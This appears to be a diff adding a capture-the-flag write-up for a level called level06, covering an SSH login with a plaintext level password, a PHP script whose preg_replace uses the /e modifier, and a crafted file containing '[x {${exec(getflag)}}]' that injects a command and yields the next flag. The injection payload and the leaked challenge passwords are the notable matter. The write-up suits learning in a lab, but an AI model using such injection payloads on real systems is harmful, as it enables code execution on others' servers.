@@ -1,0 +1,22 @@
+ssh level06@192.168.1.34 -p 4242
+viuaaale9huek52boumoomioc
+ls -la
+#We have two files with flag06 as creator, let's check out the php script :
+#
+#<?php
+#function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+#function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+#$file1 = $argv[1];
+#$file1 = file_get_contents($file1);
+#print($argv[1] . "\n");
+#$r = x($argv[1], $argv[2]); print $r;
+#?>
+
+#The line we are interrested in is : function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+#because there is a /e in the preg_replace and it is know for allowing code injection.
+#the format to match the preg_replace is [x (anything here)]
+#we just have to create a file with this format and a command instead of the anything here
+mkdir /tmp/hack
+touch /tmp/hack/hack_php
+echo "[x {\${exec(getflag)}}]" > /tmp/hack/hack_php
+./level06 /tmp/hack/hack_php ---> wiok45aaoguiboiki2tuin6ub
